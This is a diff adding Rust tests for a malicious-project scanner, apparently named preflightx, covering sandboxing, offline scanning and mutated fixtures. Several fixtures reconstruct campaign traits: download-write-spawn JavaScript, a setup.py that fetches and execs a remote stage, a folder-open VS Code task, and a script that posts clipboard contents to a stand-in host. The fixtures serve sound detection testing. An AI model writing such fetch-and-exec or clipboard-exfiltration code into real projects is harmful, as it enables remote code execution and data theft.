@@ -1,8 +1,8 @@
 use serde_json::Value;
 use std::{
-    fs,
+    fs::{self, OpenOptions},
     path::PathBuf,
-    process::Command,
+    process::{Command, Stdio},
     time::{SystemTime, UNIX_EPOCH},
 };
 
@@ -21,6 +21,10 @@ fn json_scan_completes_without_findings() {
     assert_eq!(report["summary"]["files"], 1);
     assert!(report.get("dependencies").is_none());
     assert!(report["summary"].get("dependencies").is_none());
+    #[cfg(target_os = "linux")]
+    assert!(String::from_utf8_lossy(&output.stderr).contains("OS sandbox enforced"));
+    #[cfg(not(target_os = "linux"))]
+    assert!(String::from_utf8_lossy(&output.stderr).contains("explicit --no-sandbox"));
 
     assert_schema(
         &report,
@@ -90,6 +94,107 @@ fn every_scan_profile_stays_offline_and_leaves_target_bytes_unchanged() {
         assert_eq!(fs::read_dir(&root).unwrap().count(), 3);
     }
 
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn deterministic_source_mutations_remain_bounded_and_read_only() {
+    let root = temporary_directory("source-mutation-smoke");
+    let mut expected = Vec::new();
+    let javascript = b"const value = fetch('https://example.invalid/payload'); eval(value);";
+    let disguised = b"module.exports = fetch('https://example.invalid/payload').then(eval);";
+    let task = br#"{"tasks":[{"label":"fixture","runOptions":{"runOn":"folderOpen"},"command":"node inert.js"}]}"#;
+
+    for index in 0..16_u64 {
+        let javascript_path = root.join(format!("source-{index:02}.js"));
+        let javascript_bytes = mutate_text(javascript, index);
+        fs::write(&javascript_path, &javascript_bytes).unwrap();
+        expected.push((javascript_path, javascript_bytes));
+
+        let asset_path = root.join(format!("asset-{index:02}.woff2"));
+        let asset_bytes = mutate_text(disguised, index + 16);
+        fs::write(&asset_path, &asset_bytes).unwrap();
+        expected.push((asset_path, asset_bytes));
+
+        let config_path = root
+            .join(".vscode")
+            .join(format!("case-{index:02}"))
+            .join("tasks.json");
+        fs::create_dir_all(config_path.parent().unwrap()).unwrap();
+        let config_bytes = mutate_text(task, index + 32);
+        fs::write(&config_path, &config_bytes).unwrap();
+        expected.push((config_path, config_bytes));
+    }
+    let unicode_path = root.join("source Ω e\u{301} space.js");
+    let unicode_bytes = b"const intact = 'unicode path fixture';\n".to_vec();
+    fs::write(&unicode_path, &unicode_bytes).unwrap();
+    expected.push((unicode_path, unicode_bytes));
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert!(matches!(output.status.code(), Some(0..=2)));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_schema(
+        &report,
+        include_str!("../schemas/scan-report-v2.schema.json"),
+    );
+    assert_eq!(report["summary"]["files"], expected.len());
+    assert_eq!(
+        report["status"] == "incomplete",
+        output.status.code() == Some(2)
+    );
+    for (path, bytes) in expected {
+        assert_eq!(fs::read(path).unwrap(), bytes);
+    }
+
+    fs::remove_dir_all(root).unwrap();
+}
+
+fn mutate_text(seed: &[u8], iteration: u64) -> Vec<u8> {
+    let mut bytes = seed.to_vec();
+    let position = (iteration as usize * 29 + 7) % bytes.len();
+    bytes[position] ^= 1 << (iteration as usize % 7);
+    if iteration.is_multiple_of(4) {
+        bytes.truncate(bytes.len().saturating_sub(iteration as usize % 13));
+    } else if iteration % 4 == 1 {
+        bytes.insert(position, b' ');
+    }
+    bytes
+}
+
+#[test]
+fn explicit_unsandboxed_fallback_is_reported() {
+    let root = temporary_directory("explicit-no-sandbox");
+    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json", "--no-sandbox"]);
+
+    assert_eq!(output.status.code(), Some(0));
+    assert!(String::from_utf8_lossy(&output.stderr).contains("OS sandbox disabled"));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["network_access"], "disabled");
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[cfg(target_os = "linux")]
+#[test]
+fn linux_sandbox_refuses_file_redirect_inside_scan_root() {
+    let root = temporary_directory("sandbox-output-target-write");
+    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();
+    let report_path = root.join("report.json");
+    fs::write(&report_path, b"target output sentinel").unwrap();
+    let report = OpenOptions::new().append(true).open(&report_path).unwrap();
+
+    let output = Command::new(env!("CARGO_BIN_EXE_preflightx"))
+        .arg(&root)
+        .arg("--format=json")
+        .stdout(Stdio::from(report))
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(2));
+    assert!(String::from_utf8_lossy(&output.stderr).contains("writable regular-file"));
+    assert_eq!(fs::read(&report_path).unwrap(), b"target output sentinel");
     fs::remove_dir_all(root).unwrap();
 }
 
@@ -227,6 +332,78 @@ fn malicious_project_fixtures_produce_expected_high_and_critical_findings() {
             _ => {}
         }
     }
+}
+
+#[test]
+fn reconstructed_beavertail_invisibleferret_and_ottercookie_traits_are_static() {
+    let root = temporary_directory("synthetic-campaign-traits");
+
+    let beavertail = root.join("beavertail");
+    fs::create_dir_all(&beavertail).unwrap();
+    fs::write(
+        beavertail.join("package.json"),
+        br#"{"scripts":{"start":"node main.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        beavertail.join("main.js"),
+        b"import { download } from './payload.js'; const cp = require('node:child_process'); async function start() { await download('/tmp/inert-helper'); cp.spawn('/tmp/inert-helper'); } start();",
+    )
+    .unwrap();
+    fs::write(
+        beavertail.join("payload.js"),
+        b"import { writeFile } from 'node:fs/promises'; export async function download(path) { const response = await fetch('https://example.invalid/stage'); await writeFile(path, await response.text()); }",
+    )
+    .unwrap();
+
+    let invisibleferret = root.join("invisibleferret");
+    fs::create_dir(&invisibleferret).unwrap();
+    fs::write(
+        invisibleferret.join("setup.py"),
+        b"import requests\npayload = requests.get('https://example.invalid/stage').text\nexec(payload)\n",
+    )
+    .unwrap();
+
+    let ottercookie = root.join("ottercookie");
+    fs::create_dir(&ottercookie).unwrap();
+    fs::create_dir(root.join(".vscode")).unwrap();
+    fs::write(
+        root.join(".vscode/tasks.json"),
+        br#"{"tasks":[{"label":"fixture","command":"node ottercookie/session.js","runOptions":{"runOn":"folderOpen"}}]}"#,
+    )
+    .unwrap();
+    fs::write(
+        ottercookie.join("session.js"),
+        b"const clipboardy = require('clipboardy'); const value = clipboardy.readSync(); fetch('https://example.invalid/collect', { method: 'POST', body: value }); const cp = require('node:child_process'); cp.exec('powershell -NoProfile -Command Get-Clipboard');",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "complete");
+    assert_eq!(report["network_access"], "disabled");
+    for (rule, file) in [
+        ("JS-DOWNLOAD-WRITE-EXECUTE", "beavertail/main.js"),
+        (
+            "LANG-REMOTE-DATA-EXECUTION-CAPABILITY",
+            "invisibleferret/setup.py",
+        ),
+        ("JS-SECRET-EXFILTRATION", "ottercookie/session.js"),
+        ("IDE-FOLDER-OPEN-TASK", ".vscode/tasks.json"),
+    ] {
+        assert!(
+            report["findings"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|finding| { finding["id"] == rule && finding["file"] == file }),
+            "missing {rule} for {file}: {}",
+            report["findings"]
+        );
+    }
+
+    fs::remove_dir_all(root).unwrap();
 }
 
 #[test]
@@ -3255,6 +3432,22 @@ fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
     assert!(String::from_utf8_lossy(&invalid.stderr).contains("unknown option: --online"));
 }
 
+#[cfg(not(target_os = "linux"))]
+#[test]
+fn scan_fails_closed_when_the_platform_sandbox_is_unavailable() {
+    let root = temporary_directory("unsupported-sandbox");
+    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();
+
+    let output = Command::new(env!("CARGO_BIN_EXE_preflightx"))
+        .arg(&root)
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(2));
+    assert!(String::from_utf8_lossy(&output.stderr).contains("pass --no-sandbox to opt out"));
+    fs::remove_dir_all(root).unwrap();
+}
+
 #[test]
 fn rule_commands_explain_implemented_detection() {
     let list = run(&["rules"]);
@@ -3270,10 +3463,19 @@ fn rule_commands_explain_implemented_detection() {
 }
 
 fn run(arguments: &[&str]) -> std::process::Output {
-    Command::new(env!("CARGO_BIN_EXE_preflightx"))
-        .args(arguments)
-        .output()
-        .unwrap()
+    let mut command = Command::new(env!("CARGO_BIN_EXE_preflightx"));
+    command.args(arguments);
+    if !cfg!(target_os = "linux") && is_scan_command(arguments) {
+        command.arg("--no-sandbox");
+    }
+    command.output().unwrap()
+}
+
+fn is_scan_command(arguments: &[&str]) -> bool {
+    !matches!(
+        arguments.first().copied(),
+        Some("rules" | "explain" | "version" | "--version" | "-V" | "--help" | "-h" | "doctor")
+    )
 }
 
 fn assert_schema(instance: &Value, schema_text: &str) {
